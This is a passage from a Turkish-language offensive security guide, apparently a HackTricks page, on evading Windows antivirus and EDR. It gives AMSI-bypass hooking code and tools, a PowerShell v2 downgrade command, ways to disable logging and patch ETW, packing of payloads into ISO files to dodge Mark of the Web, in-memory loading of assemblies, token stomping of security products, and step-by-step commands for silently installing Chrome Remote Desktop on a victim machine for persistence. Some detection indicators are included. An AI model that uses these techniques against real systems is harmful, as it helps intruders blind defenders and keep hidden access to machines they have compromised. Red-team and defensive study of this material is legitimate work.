    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve özel loader'lar genelinde çalışır (aksi durumda AMSI'yi yükleyecek her şeyde).
- Uzun komut satırı izlerini önlemek için betikleri stdin üzerinden göndermekle birlikte kullanın (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins üzerinden çalıştırılan loader'lar tarafından kullanıldığı görülmüştür (ör. `DllRegisterServer` çağıran `regsvr32`).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi bypass etmek için betik üretir.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da imzadan kaçınmak için rastgeleleştirilmiş kullanıcı tanımlı işlevler, değişkenler ve karakter ifadeleri kullanan, ayrıca imzadan kaçınmak üzere PowerShell anahtar sözcüklerinin karakter büyüklüklerini rastgele değiştiren bir AMSI bypass betiği üretir.

**Tespit edilen imzayı kaldırma**

Geçerli işlemin belleğinden tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçlar kullanabilirsiniz. Bu araç, geçerli işlemin belleğini AMSI imzası için tarar ve ardından imzayı NOP talimatlarıyla üzerine yazarak belleğinden etkili biçimde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2'yi kullanın**
PowerShell sürüm 2'yi kullanırsanız AMSI yüklenmez; böylece betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şöyle yapabilirsiniz:

```bash
powershell.exe -version 2
```

## PowerShell Günlük Kaydı

PowerShell günlük kaydı, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Denetim ve sorun giderme amaçlarıyla kullanışlı olabilir, ancak **tespit edilmekten kaçınmak isteyen saldırganlar için bir sorun da olabilir**.

PowerShell günlük kaydını atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell sürüm 2'yi kullanın**: PowerShell sürüm 2'yi kullanırsanız AMSI yüklenmez ve böylece betiklerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Yönetilmeyen bir PowerShell oturumu kullanın**: `powershell.exe` başlatmadan PowerShell'i barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu, özellikle `powershell.exe` işlemine bağlı denetimleri atlatır; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını doğrudan devre dışı bırakmaz. Kapsama, çalışma zamanına ve host uygulamasına bağlıdır.


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği verileri şifrelemeye dayanır. Bu, binary'nin entropisini artırarak AV'lerin ve EDR'lerin onu tespit etmesini kolaylaştırır. Buna dikkat edin; şifrelemeyi yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulamayı düşünebilirsiniz.

### ConfuserEx ile Korunan .NET Binary'lerinin Deobfuscation İşlemi

ConfuserEx 2 (veya ticari fork'larını) kullanan malware'i analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilecek, orijinale yakın bir IL'yi güvenilir biçimde **geri yükler**.<sup>[[10]](#references)</sup>

1.  Anti-tampering korumasını kaldırma – ConfuserEx her *method body*'yi şifreler ve şifreyi *module* static constructor'ı (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum'ını da yamalar; bu nedenle yapılacak herhangi bir değişiklik binary'nin çökmesine neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly'yi yeniden yazmak için **AntiTamperKiller** kullanın:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Çıktı, kendi unpacker'ınızı oluştururken işinize yarayabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / control-flow kurtarma – *clean* dosyayı **de4dot-cex**'e (ConfuserEx desteği eklenmiş bir de4dot fork'u) verin.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Bayraklar:
     • `-p crx` – ConfuserEx 2 profilini seçin
     • de4dot, control-flow flattening'i geri alır, özgün namespace'leri, sınıfları ve değişken adlarını geri yükler ve sabit dizeleri çözer.

3.  Proxy-call stripping – ConfuserEx, decompilation'ı daha da zorlaştırmak için doğrudan method çağrılarını lightweight wrapper'larla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Bu adımdan sonra opaque wrapper functions (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'leri görmelisiniz.

4.  Manuel temizleme – elde edilen binary'yi dnSpy altında çalıştırın ve gerçek payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware bunu genellikle `<Module>.byte_0` içinde başlatılan, TLV ile kodlanmış bir byte array olarak saklar.

Yukarıdaki zincir, zararlı örneği çalıştırmaya **gerek kalmadan** execution flow'u geri yükler – offline bir workstation'da çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak triage etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı bir custom attribute üretir.

#### Tek satırlık komut
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla yazılım güvenliğini artırabilen, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir harici araç kullanmadan ve derleyicide değişiklik yapmadan, derleme zamanında obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı kırmaya çalışan kişinin işini biraz daha zorlaştıracak, C++ template metaprogramming framework'ü tarafından oluşturulan obfuscated işlemler katmanı ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz; .exe, .dll ve .sys dâhil olmak üzere çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele yürütülebilir dosyalar için basit bir metamorphic code motorudur.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan ve LLVM destekli diller için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek bir programı assembly code düzeyinde obfuscate eder ve normal control flow'a dair doğal anlayışımızı boşa çıkarır.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürüp yükleyebilir.

### LLVM compiler-assisted per-function self-masking

Tüm implantı yalnızca uyurken maskelemek yerine, değiştirilmiş bir LLVM X86 backend seçili işlevleri etkin olmadıkları süre boyunca XOR-maskeli tutabilir. Function Peekaboo PoC, adında `REG_` bulunan demangle edilmiş isimleri seçer, son makine kodunun çevresine position-independent giriş/çıkış stub'ları ekler ve `.text` içine paylaşılan tek bir masking handler yazar; kaynak düzeyindeki imzalar ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Bu işlem, instruction selection ve optimization sonrasında yapılmalıdır; çünkü dönüşümün **üretilen her return** talimatını kapsaması ve x86 yerleşiminin tam olarak bilinmesi gerekir. Emission öncesinde çalışan bir `MachineFunctionPass`, son `MachineInstr::isReturn()` talimatını bulur, silerek son yolun eklenen epilogue'a düşmesini sağlar ve önceki return talimatlarını `JMP_1 handler` ile değiştirir. Her return öncesinde derleyicinin ürettiği stack/frame temizleme işlemlerini koruyun; yalnızca return talimatının kendisini yönlendirin.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `emitFunctionBodyEnd()` işlev başına stub'ları, `emitEndOfAsmFile()` ise handler'ı üretir. Emission aşamaları arasında paylaşılan semboller, prologue'daki bir branch'in daha sonra üretilecek epilogue'u hedeflemesini sağlar. Elle üretilen bir near `je` için `0F 84` yazıp ardından dört baytlık MC ifadesi `target - address_after_je` ekleyin. Handler'a yapılan call ve jump işlemleri bunun yerine `MCInst` nesneleriyle (`CALL64pcrel32` ve `JMP_1`) üretilebilir. Hiçbir değişiklik yapmadığında pass, seçilmeyen bir işlev için `false` döndürmelidir; PoC bu durumda yanlışlıkla `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC, bir XOR key'i ve loader-relocated function pointer ile çalışma zamanı uzunluğunu içeren 16 baytlık kayıtları `.funcmeta` içine yerleştirir. C alanı `uint32_t` olsa da handler, kaydın `+8` offset'inde bir QWORD'a erişerek uzunlukla birlikte padding'i de okur ve kayıtlar arasında `0x10` ilerler. PE section adları yalnızca sekiz bayt olduğundan çalışma zamanındaki arama `.funcmet` değerini görür. Harici bir patcher, yürütülebilir bir `.stub` ekler, eski entry-point RVA değerini stub içine kaydeder ve `AddressOfEntryPoint` değerini yeniden yönlendirir. PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` üzerinden alır, önceden import edilmiş bir `VirtualProtect` işlevini çözmek için PE32+ import'larını tarar ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` içine bir sentinel yazar ve metadata'daki her işlevi çağırır. Sürekli okunabilir durumdaki prologue, işlev başlangıcını `gs:[0xF0]` içine kaydeder, sentinel'i algılar ve henüz maskelenmemiş gövdeyi atlar. Ardından epilogue `call handler` kullanır. Handler 13 register'ı (`0x68` bayt) kaydettikten sonra, `[rsp+0x68]` adresindeki dönüş adresi dönüştürülmüş işlevin sonudur; bu nedenle `end - start` değeri metadata kaydına yazılabilir. Tüm gövdeler maskelendikten sonra stub sentinel'i temizler ve `ImageBase + original_entry_point_RVA` adresine jump eder.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir çağrı sırasında prologue, gövdenin şifresini çözmek için aynı simetrik handler'ı çağırır. Son yol eklenen epilogue'a düşerken, önceki her return doğrudan paylaşılan handler'a jump eder. Normal epilogue da `call` yerine `jmp handler` kullanır; böylece yeniden maskelemenin ardından handler'ın `ret` talimatı çağıran tarafın özgün dönüş adresini kullanır ve işlev sonucunu `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler geçerli kaydı bulur, sabit ve görünür prologue'u (`0x46` bayt) atlar, kalan bölümü `PAGE_EXECUTE_READWRITE` olarak ayarlar, düşük key baytını kullanarak byte-by-byte XOR uygular ve ardından bölümü `PAGE_EXECUTE_READ` olarak ayarlar. Böylece aynı döngü girişte şifreyi çözer, her normal çıkışta ise yeniden şifreler.<sup>[[38]](#references)[[39]](#references)</sup>

Bu tasarımın güçlü göstergeleri şunlardır:<sup>[[38]](#references)[[39]](#references)</sup>

- yürütülebilir bir `.stub` içindeki entry point ve bir key ile relocate edilmiş `.text` pointer'larını barındıran `.funcmet` bölümü;
- pre-CRT PEB, import table ve section table ayrıştırmasının ardından her metadata pointer'ı üzerinden yapılan çağrılar;
- birbirinin aynısı `call`/`pop` PIC prologue'ları ve tek bir handler'a yönlendirilen çok sayıda return noktası;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` adreslerine yapılan yazmaların ardından tekrarlanan `VirtualProtect` geçişleri ve image-backed yürütülebilir sayfalara yapılan bytewise XOR yazmaları.

Bu, cryptographic protection değil, memory scanner'dan kaçınma yöntemidir: patch'lenmiş dosya özgün ve maskelenmemiş gövdeyi hâlâ içerir; debugger ise `VirtualProtect` veya XOR döngüsü üzerinde durup etkin işlevi belleğe dökebilir. Tek baytlık XOR, okunabilir metadata ve sabit `0x46` sınırı da çevrimdışı kurtarmayı kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'nin TEB slot'ları thread-local olsa da değiştirilmiş code page'leri process-wide'dir. Bu nedenle eşzamanlı veya özyinelemeli giriş, başka bir çağrı çalışırken talimatların yeniden toggle edilmesine yol açabilir; exception'lar ve nonlocal exit'ler de yeniden maskelemeyi atlayabilir. Sağlam bir uygulama geçişleri senkronize etmeli, `lpflOldProtect` üzerinden döndürülen gerçek koruma değerini geri yüklemeli, hard-coded stub uzunluklarından kaçınmalı, x64 stack alignment açısından hem `call` hem de `jmp` yollarını denetlemeli ve yürütülebilir baytları yeniden yazdıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, yürütülebilir kod değiştirildiğinde instruction-cache tutarlılığını sağlamanın çağıranın sorumluluğunda olduğunu açıkça belirtir.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaya karşı korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen çoğunlukla itibara dayalı bir yaklaşım kullanır. Bu nedenle nadiren indirilen uygulamalar SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve dosyayı çalıştırmasını engeller (ancak More Info -> Run anyway seçeneğine tıklayarak dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir. İnternetten indirilen dosyalar oluşturulurken, dosyanın indirildiği URL ile birlikte otomatik olarak oluşturulur.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS bilgisini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir signing certificate ile imzalanmış yürütülebilir dosyaların **SmartScreen'i tetiklemeyeceğini** unutmayın.

Payload'larınızın Mark of The Web almasını engellemenin çok etkili bir yolu, onları ISO gibi bir container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **NTFS olmayan** birimlere **uygulanamamasıdır**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak için payload'ları çıktı container'larına paketleyen bir araçtır.

Örnek kullanım:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarına paketleyip SmartScreen'i bypass etme demosu.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Windows için Event Tracing (ETW), uygulamaların ve sistem bileşenlerinin **olayları günlüğe kaydetmesini** sağlayan güçlü bir Windows günlükleme mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, kullanıcı alanındaki sürecin **`EtwEventWrite`** işlevinin herhangi bir olayı günlüğe kaydetmeden hemen dönmesini sağlamak da mümkündür. Bunun için işlev bellekte yamalanarak hemen dönecek hâle getirilir ve böylece ilgili süreç için ETW günlüklemesi etkili biçimde devre dışı bırakılır.

Daha fazla bilgiye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinden ulaşabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini belleğe yüklemek uzun zamandır bilinen bir yöntemdir ve post-exploitation araçlarınızı AV'ye yakalanmadan çalıştırmak için hâlâ çok iyi bir yoldur.

Payload doğrudan belleğe yükleneceği ve diske dokunmayacağı için yalnızca tüm süreç için AMSI'yi yamalamamız gerekir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma olanağı sunar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir feda edilebilir süreç başlatmayı**, post-exploitation amaçlı kötü amaçlı kodunuzu bu yeni sürece enjekte etmeyi, kodunuzu çalıştırmayı ve işlem tamamlandığında yeni süreci sonlandırmayı içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, yürütmenin Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation işlemlerimiz sırasında bir şeyler ters giderse veya tespit edilirse **implantımızın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Davranışsal Tespitler** tarafından yakalanma **olasılığının daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation amaçlı kötü amaçlı kodu **kendi sürecine** enjekte etmeyi içerir. Böylece yeni bir süreç oluşturup AV tarafından taranmasını önleyebilirsiniz; ancak payload'unuz çalışırken bir şeyler ters giderse süreç çökebileceği için **beacon'ınızı kaybetme olasılığınız çok daha yüksektir**.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek istiyorsanız şu makaleye [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'larına ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assembly'lerini **PowerShell'den** de yükleyebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.

## .NET araçlarının NativeAOT WebAssembly ile yeniden paketlenmesi (WasmForge)

Normal `execute-assembly` teknikleri, tanınabilir MSIL'i korur ve sonunda bir CLR başlatır. **WasmForge** bunun yerine yürütme altyapısını değiştirir: Bir C# projesini deneysel NativeAOT-LLVM WASI hedefine taşır, önceden WebAssembly'ye derler ve bu modülü Wazero tabanlı bir Windows PE ana makinesine gömer. Ortaya çıkan süreç hedef sistemin CLR'sına, JIT'ine veya `dotnet` ana makinesine ihtiyaç duymaz; bu nedenle yalnızca yönetilen assembly adlarına, CLR yüklemesine, AMSI'ye veya .NET ETW'ye dayalı kurallar doğrudan görünürlüğünü kaybeder. Bu bir kaçınma/paketleme tekniğidir, ayrıcalık sınırını aşma yöntemi değildir; konuk süreç orijinal aracın izinlerini ve gözlemlenebilir işletim sistemi davranışlarını korur.<sup>[[44]](#references)[[45]](#references)</sup>

### C# projesi derleme

Önerilen derleme yolu, .NET 10 SDK'sını, NativeAOT-LLVM workload'unu, WASI SDK 24.0'ı, linker'ı ve imzalama bağımlılıklarını içerdiği için projenin Docker ortamıdır. Bir `.csproj` otomatik olarak algılanır; tek seferlik derleme taşıma, uyumluluk yamalama, WASM derlemesi, PE oluşturma ve imzalama işlemlerini gerçekleştirir.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Sorun giderme veya oluşturulan kodu gözden geçirme için süreci `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` ve son olarak `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` adımlarına bölün. Derleme imajı ayrıca WASI Preview 2 component encoding'i atlayıp embedded runtime'ın beklediği düz modülü üretmek için bir `wasm-component-ld` wrapper'ı kullanır.<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# ile x64 Win32 Arasında Köprüleme

Bu, şeffaf bir yeniden derleme değildir. NativeAOT-WASI, Windows odaklı BCL özelliklerini desteklemez veya değiştirir; ayrıca wasm32 guest genellikle dört baytlık pointer slot'ları ayırırken x64 API'leri sekiz baytlık pointer'lar döndürebilir. WasmForge bu iki sorunu aşağıdaki oluşturulan katmanlarla ele alır:<sup>[[44]](#references)</sup>

1. Bir source patcher, AOT'ye özgü anlamsal farklılıkları düzeltir ve desteklenmeyen registry, pipes, WMI, identity, directory-service, file-version, LSA ve benzeri çağrıları `Wf*` helper'larına yönlendirir.
2. Bir P/Invoke scanner, `[DllImport]` çağrılarının guest içinde tanımlanan DLL'i dinamik olarak yüklemek yerine, linked C bridge sembollerine bağlanması için NativeAOT `DirectPInvoke` eşlemeleri üretir.
3. Host'a bağlı pointer'lar C#'ta `ulong`, C'de `uint64_t` kullanır. Genel bir dispatcher çağrıyı host'un Win32 handler'ına iletir; `out8_mask`, üst yarıları korunması gereken gerçek sekiz baytlık output slot'larını işaretler. İşaretlenmemiş wasm32 biçimli output'lar, x64 yazma işleminin bitişik dört baytı bozmasını önlemek için snapshot/restore koruması kullanır.
4. Özel host bridge'leri, LSA ticket-cache erişimi, yapılandırılmış sonuçlar içeren Kerberos/BCrypt işlemleri, TCP KDC trafiği ve LDAP sorguları gibi genel syscall dispatch'e uymayan işlemleri yönetir.

Örneğin, `version.dll!VerQueryValueW` için bir wrapper dört host adresini geçirir ve 2. ile 3. bitleri (`0xC`) ayarlar; çünkü value pointer'ı ve length, sekiz baytlık output slot'larıdır. Wrapper genel kalır ve DLL adını, export adını, argümanları ve mask'i `wf_call_v2`'ye iletir; host pointer dönüşümünü yapar ve native API'yi çağırır.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Sınırlamalar ve tespit pivotları

Reflection ağırlıklı kod, dinamik assembly yükleme, keyfi native callback'ler ve WASM belleğine döndürülen karmaşık x64 yapıları yine de araç başına yamalar gerektirebilir veya tamamen başarısız olabilir. Genel WASI Preview 2 soketleri no-op stub'lara da ulaşabilir; bu nedenle desteklenen araçlar protokole özgü host shim'leri kullanır. Özellik eşitliği olduğunu varsaymak yerine her komutu native bir build'e karşı doğrulayın.<sup>[[44]](#references)[[45]](#references)</sup>

Bu teknik, payload'u görünmez kılmak yerine telemetriyi başka yöne kaydırır. Tespit, WASM modülü içeren veya bellekte oluşturan bir PE'ye, Wazero benzeri runtime davranışına, olağandışı host/guest bellek ayırma ve kopyalama işlemlerine, genel doğrudan Win32 çağrılarına, imzalama ve PE-resource anormalliklerine ve bunların sonucunda oluşan API çağrıları ile ağ trafiğine yönelebilir. Bu nedenle CLR-load, AMSI veya .NET ETW olaylarının olmaması, bir sürecin zararsız olduğunun kanıtı olarak değerlendirilmemelidir.<sup>[[44]](#references)</sup>

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği gibi, ele geçirilmiş makineye **Saldırganın Kontrolündeki SMB paylaşımında yüklü yorumlayıcı ortamına erişim vererek** diğer dillerle kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki Interpreter Binaries ve ortama erişim vererek, ele geçirilmiş makinenin belleğinde bu dillerde **keyfi kod çalıştırabilirsiniz**.

Repo'da belirtildiği üzere: Defender script'leri taramaya devam ediyor ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esnekliğe** sahip oluyoruz. Bu dillerde rastgele, obfuscation uygulanmamış reverse shell script'leriyle yapılan testler başarılı oldu.

## Statik analizden kaçınmak için WebAssembly'yi yeniden barındırma

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün access token'ını manipüle eder. Token'ın ayrıcalıklarını azaltmak, sürecin çalışır durumda kalmasını sağlarken ayrıcalıklı inceleme veya düzeltme işlemlerini yapmasını engelleyebilir.

Bunu önlemek için Windows, **harici süreçlerin** güvenlik süreçlerinin token'ları üzerinde handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılımları Kullanma

### Chrome Remote Desktop

[**Bu blog gönderisinde**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, kurbanın PC'sine Chrome Remote Desktop'ı dağıtmak, ardından makineyi ele geçirmek ve persistence sağlamak için kullanmak kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine ve ardından MSI dosyasını indirmek için Windows MSI dosyasına tıklayın.
2. Kurulum programını kurban makinede sessizce çalıştırın (admin gereklidir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönüp next'e tıklayın. Sihirbaz yetkilendirme isteyecek; devam etmek için Authorize düğmesine tıklayın.
4. Verilen komutu gerekli düzenlemelerle çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi, GUI kullanmadan PIN'i ayarlar).
 

## İleri Seviye Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion çok karmaşık bir konudur; bazen tek bir sistemdeki birçok farklı telemetri kaynağını hesaba katmanız gerekir, bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaşacağınız her ortamın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha ileri seviye Evasion teknikleri konusunda bir başlangıç noktası edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi önemle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılan harika bir başka konuşma.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi kısımları zararlı bulduğunu kontrol etme**

Defender'ın hangi kısmı zararlı bulduğunu belirleyip bunu size ayırana kadar **binary'nin bazı kısımlarını kaldıran** [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz.\
**Aynı işi yapan** başka bir araç da, hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunan [**avred**](https://github.com/dobin/avred)'dir.

### **Telnet Server**

